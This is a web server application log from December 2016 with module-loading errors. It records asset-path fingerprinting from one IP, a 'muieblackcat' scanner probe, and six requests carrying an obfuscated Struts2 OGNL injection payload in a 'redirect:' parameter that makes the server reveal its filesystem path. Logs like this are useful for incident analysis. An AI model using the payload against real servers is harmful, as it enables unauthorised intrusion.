[ 2016-12-05T20:00:29+08:00 ] 120.27.118.20 /images/public/hr_tijiao.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]

[ 2016-12-05T20:00:30+08:00 ] 120.27.118.20 /template/skin6/cn/images/ico_zlxz.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]

[ 2016-12-05T20:00:30+08:00 ] 120.27.118.20 /inc/image/bj.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]

[ 2016-12-05T20:00:30+08:00 ] 120.27.118.20 /install/style.css
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:Install

[ 2016-12-05T20:00:30+08:00 ] 120.27.118.20 /admin/images/arrow_right_8x8.png
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]

[ 2016-12-05T20:00:31+08:00 ] 120.27.118.20 /static/common/topic-min-img.png
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]

[ 2016-12-05T20:00:31+08:00 ] 120.27.118.20 /image/admin/add.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]

[ 2016-12-05T20:00:31+08:00 ] 120.27.118.20 /image/cflag/ad.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]

[ 2016-12-05T20:00:31+08:00 ] 120.27.118.20 /Admin/images/install_lines.jpg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]

[ 2016-12-05T20:00:32+08:00 ] 120.27.118.20 /Utility/pics/status-green.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]

[ 2016-12-05T20:00:34+08:00 ] 120.27.118.20 /product/waterimage/200x200.png
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]

[ 2016-12-05T20:00:34+08:00 ] 120.27.118.20 /install/images/header-corners.png
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]

[ 2016-12-05T21:11:16+08:00 ] 222.186.56.246 /admin/loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
ERR: 无法加载模块:Admin

[ 2016-12-05T21:11:18+08:00 ] 222.186.56.246 /admin/index.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: 无法加载模块:Admin

[ 2016-12-05T21:11:18+08:00 ] 222.186.56.246 /login/Jeecms.do?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000094s ]
ERR: 无法加载模块:Login

[ 2016-12-05T21:11:19+08:00 ] 222.186.56.246 /index.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: 无法加载模块:Index

[ 2016-12-05T21:11:19+08:00 ] 222.186.56.246 /loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:LoginAction

[ 2016-12-05T21:11:19+08:00 ] 222.186.56.246 /login.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Login

[ 2016-12-05T22:03:05+08:00 ] 80.82.78.38 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]

[ 2016-12-05T22:43:46+08:00 ] 89.248.169.50 /muieblackcat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000097s ]
ERR: 无法加载模块:Muieblackcat

[ 2016-12-05T23:23:53+08:00 ] 219.133.49.231 /proxy.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: 无法加载模块:Proxy

[ 2016-12-05T23:40:08+08:00 ] 120.27.118.20 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]

